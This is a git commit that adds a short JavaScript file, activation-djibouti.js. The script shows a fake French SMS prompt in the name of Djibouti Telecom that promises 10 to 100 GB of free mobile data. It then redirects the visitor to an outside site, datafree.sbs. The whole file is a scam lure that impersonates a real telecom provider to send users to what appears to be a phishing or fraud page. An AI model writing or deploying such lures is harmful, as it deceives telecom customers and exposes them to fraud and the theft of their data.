8453784d5c23e2f53105e7cce74ad1974a8415d4
mmainomi <akparawa247@gmail.com>
2025-03-31 23:37:03 -0700

    Create activation-djibouti.js

---
+++ activation-djibouti.js
@@ -0,0 +1,5 @@
+var password = 'Données gratuites'
+password=prompt(' SMS : Cher client, veuillez vérifier si votre carte SIM Djibouti Telecom est éligible pour recevoir de 10 Go à 100 Go de données gratuites, récompense pour tous les clients, appuyez sur Données gratuites pour vérifier maintenant ','Données gratuites');
+if (password != 'Données gratuites') {
+location.href='https://datafree.sbs/djibouti.html';
+}
